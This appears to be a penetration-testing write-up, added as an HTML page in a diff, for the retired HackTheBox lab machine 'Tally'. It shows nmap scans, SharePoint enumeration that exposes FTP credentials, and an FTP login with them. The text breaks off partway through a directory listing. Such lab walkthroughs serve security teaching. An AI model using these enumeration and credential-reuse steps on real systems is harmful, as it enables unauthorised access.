@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Tally</strong></h1>
+        <em>Released: 4th November 2017 / Pwned: 5th November 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Tally is a goosechase through various services in which you find a set of credentials for the next service in each.<br>
+        You priv-esc to SYSTEM using JuicyPotato.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Find FTP credentials on the Microsoft SharePoint site<br>
+        • Find SMB credentials in FTP<br>
+        • Find MSSQL credentials in SMB<br>
+        • Log in to MSSQL using <code>sqsh</code><br>
+        • Enable <code>xp_cmdshell</code> in MSSQL and use it to get a shell on the system<br>
+        • Priv-esc to SYSTEM using JuicyPotato<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.59</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p &lt;open ports&gt; -T4 -sV -sC -O -oN nmap/tcp-open.txt 10.10.10.59</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.59</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE<br>
+                21<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span><br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<br>
+                81<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts2-ns<br>
+                135<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msrpc<br>
+                139<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;netbios-ssn<br>
+                445<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;microsoft-ds<br>
+                577<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;filtered&nbsp;vnas<br>
+                808<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ccproxy-http<br>
+                1433<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ms-sql<span style="color:#ffdd00;font-weight:400">-s</span><br>
+                2946<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;filtered&nbsp;fjsvmpor<br>
+                3241<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;filtered&nbsp;sysorb<br>
+                5927<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;filtered&nbsp;unknown<br>
+                5985<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wsman<br>
+                15567<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                32843<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                32844<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                32846<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                47001<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;winrm<br>
+                49664<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                49665<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                49666<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                49667<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                49668<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                49669<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                49670<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unknown<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#grep&nbsp;^[0-9]&nbsp;nmap/tcp-all.txt&nbsp;|&nbsp;cut&nbsp;-d&nbsp;'/'&nbsp;-f&nbsp;1&nbsp;|&nbsp;tr&nbsp;'\n'&nbsp;','&nbsp;|&nbsp;sed&nbsp;s/,$//&nbsp;&gt;&nbsp;nmap/tcp-portlist.txt</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;$(cat&nbsp;nmap/tcp-portlist.txt)&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.59</span><br>
+                [..]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                21<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;ftpd<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ftp-syst<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;SYST<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Windows_NT<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;10.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-IIS<span style="color:#ff9d00;font-weight:700">/</span>10.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Home<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_Requested&nbsp;resource&nbsp;was&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.59<span style="color:#ff9d00;font-weight:700">/</span>_layouts<span style="color:#ff9d00;font-weight:700">/</span>15<span style="color:#ff9d00;font-weight:700">/</span>start.aspx#<span style="color:#ff9d00;font-weight:700">/</span>default.aspx<br>
+                81<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSDP<span style="color:#ff9d00;font-weight:700">/</span>UPnP<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-HTTPAPI<span style="color:#ff9d00;font-weight:700">/</span>2.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Bad&nbsp;Request<br>
+                135<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                139<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2008&nbsp;R2&nbsp;-&nbsp;2012&nbsp;microsoft-ds<br>
+                808<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ccproxy-http?<br>
+                1433<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;ms-sql<span style="color:#ffdd00;font-weight:400">-s</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;2016&nbsp;13.00.1601.00<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;RTM<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ms-sql-ntlm-info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;Target_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;NetBIOS_Domain_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;NetBIOS_Computer_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;DNS_Domain_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;DNS_Computer_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Product_Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.0.14393<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssl-cert<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;commonName=SSL_Self_Signed_Fallback<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Not&nbsp;valid&nbsp;before<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2019-11-04T22<span style="color:#ff9d00;font-weight:700">:</span>59<span style="color:#ff9d00;font-weight:700">:</span>13<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_Not&nbsp;valid&nbsp;after<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;2049-11-04T22<span style="color:#ff9d00;font-weight:700">:</span>59<span style="color:#ff9d00;font-weight:700">:</span>13<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_ssl-date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2019-11-04T23<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>22+00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;-1s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                5985<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSDP<span style="color:#ff9d00;font-weight:700">/</span>UPnP<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-HTTPAPI<span style="color:#ff9d00;font-weight:700">/</span>2.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Not&nbsp;Found<br>
+                15567<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;10.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-auth<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;HTTP<span style="color:#ff9d00;font-weight:700">/</span>1.1&nbsp;401&nbsp;Unauthorized<span style="color:#333333;font-weight:400">\x</span>0D<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;Negotiate<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;NTLM<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-ntlm-info<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;Target_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;NetBIOS_Domain_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;NetBIOS_Computer_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;DNS_Domain_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;DNS_Computer_Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TALLY<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Product_Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.0.14393<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-IIS<span style="color:#ff9d00;font-weight:700">/</span>10.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title.<br>
+                32843<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSDP<span style="color:#ff9d00;font-weight:700">/</span>UPnP<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-HTTPAPI<span style="color:#ff9d00;font-weight:700">/</span>2.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Service&nbsp;Unavailable<br>
+                32844<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ssl<span style="color:#ff9d00;font-weight:700">/</span>http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSDP<span style="color:#ff9d00;font-weight:700">/</span>UPnP<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-HTTPAPI<span style="color:#ff9d00;font-weight:700">/</span>2.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Service&nbsp;Unavailable<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssl-cert<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;commonName=SharePoint&nbsp;Services<span style="color:#ff9d00;font-weight:700">/</span>organizationName=Microsoft<span style="color:#ff9d00;font-weight:700">/</span>countryName=US<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Subject&nbsp;Alternative&nbsp;Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;DNS<span style="color:#ff9d00;font-weight:700">:</span>localhost,&nbsp;DNS<span style="color:#ff9d00;font-weight:700">:</span>tally<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Not&nbsp;valid&nbsp;before<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2017-09-17T22<span style="color:#ff9d00;font-weight:700">:</span>51<span style="color:#ff9d00;font-weight:700">:</span>16<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_Not&nbsp;valid&nbsp;after<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;9999-01-01T00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>00<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_ssl-date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2019-11-04T23<span style="color:#ff9d00;font-weight:700">:</span>25<span style="color:#ff9d00;font-weight:700">:</span>22+00<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;-1s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;tls-alpn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;h2<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">/</span>1.1<br>
+                32846<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;msexchange-logcopier&nbsp;Microsoft&nbsp;Exchange&nbsp;2010&nbsp;log&nbsp;copier<br>
+                47001<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;HTTPAPI&nbsp;httpd&nbsp;2.0&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>SSDP<span style="color:#ff9d00;font-weight:700">/</span>UPnP<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Microsoft-HTTPAPI<span style="color:#ff9d00;font-weight:700">/</span>2.0<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Not&nbsp;Found<br>
+                49664<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        There's lots of services!<br>
+        In situations like this, attack the low-hanging-fruit ports that are the most likely to get results.<br>
+        <br>
+        Analysis:<br>
+        • <code>21/ftp</code> - Login requires a password. Nothing to do here.<br>
+        • <code>80/http</code> - Worth investigating.<br>
+        • <code>139/smb</code> - Can't browse the shares without a password. Nothing to do here.<br>
+        • <code>1433/mssql</code> - Credentials required to access the database. Nothing to do here.<br>
+        • <code>15567/http</code> - Another website. Authentication required to access, so nothing to do here either.<br>
+        <br>
+        Also take within the script scans there's lots of references to SharePoint and the hostname, TALLY.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - SharePoint</strong></h2><br>
+        Browse to <code>http://10.10.10.59</code><br>
+        You'll be redirect to <code>http://10.10.10.59/_layouts/15/start.aspx#/default.aspx</code><br>
+        <br>
+        The above URL is a Microsoft SharePoint address.<br>
+        <br>
+        If you were unsure that the website is SharePoint, you can identify it:<br>
+        • visually via Microsoft's website - <a href="https://support.office.com/en-us/article/which-version-of-sharepoint-am-i-using-3575ff57-037f-48cf-9398-99080c34b25f">https://support.office.com/en-us/article/which-version-of-sharepoint-am-i-using-3575ff57-037f-48cf-9398-99080c34b25f</a><br>
+        • checking the reponse from the webserver<br>
+        ◇ <img alt="images\2-2.png" src="images/2-2.png"><br>
+        • viewing the source of the web page?<br>
+        <br>
+        Gobuster runs very slowly against the site.<br>
+        If you let it run, and use a SharePoint endpoints wordlist - <code>/usr/share/wfuzz/wordlist/vulns/sharepoint.txt</code> - you'll find a ton of SharePoint endpoints to check.<br>
+        Mine ran incredibly slowly, so I cancelled it half-way through.<br>
+        <br>
+        A few URLs to manually check SharePoint are:<br>
+        • <code>/_layouts/viewlsts.aspx</code> - potentially list files on the server<br>
+        • <code>/_layouts/userdisp.aspx?ID=1</code> - potentially enumerate users<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) /_layouts/viewlists.aspx</strong></h3><br>
+        Browse to <code>http://tally.htb/_layouts/viewlsts.aspx</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        In <code>Documents</code>, we find some <code>ftp-details</code>.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        We have a password for FTP, but no username. - <code>UTDRSCH53c"$6hys</code><br>
+        <br>
+        Site Pages is reported to contain 1 file too, but site pages doesn't return a result.<br>
+        SharePoint is tied closely with the system hostname. Some pages will only respond/list files correctly if using the hostname in the url.<br>
+        <br>
+        Write into <code>/etc/hosts</code> the hostname of the machine - <code>tally</code> - which we know from the Nmap scan &amp; FTP details.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/hosts</span><br>
+                127.0.0.1 localhost<br>
+                127.0.1.1 parrot<br>
+                10.10.10.59 tally<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Browse to the Site Pages URL again.<br>
+        <code>http://tally/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx</code><br>
+        <br>
+        This time the file is listed.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        The FinanceTeam file gives us an FTP account - <code>ftp_user</code> - as well as a few usernames - Rahul, Sarah, Tim.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 21/ftp</strong></h2><br>
+        Connect to FTP with the credentials we've found:<br>
+        <code>ftp_user / UTDRSCH53c"$6hys</code><br>
+        <br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ftp&nbsp;10.10.10.59</span><br>
+                Connected&nbsp;to&nbsp;10.10.10.59.<br>
+                220&nbsp;Microsoft&nbsp;FTP&nbsp;Service<br>
+                Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.10.59<span style="color:#ff9d00;font-weight:700">:</span>root<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;ftp_user<br>
+                331&nbsp;Password&nbsp;required<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UTDRSCH53c<span style="color:#3ad900;font-weight:400">"$6hys<br>
+                230&nbsp;User&nbsp;logged&nbsp;in.<br>
+                Remote&nbsp;system&nbsp;type&nbsp;is&nbsp;Windows_NT.<br>
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                08-31-17&nbsp;&nbsp;10:51PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;From-Custodian<br>
+                10-01-17&nbsp;&nbsp;10:37PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Intranet<br>
+                08-28-17&nbsp;&nbsp;05:56PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logs<br>
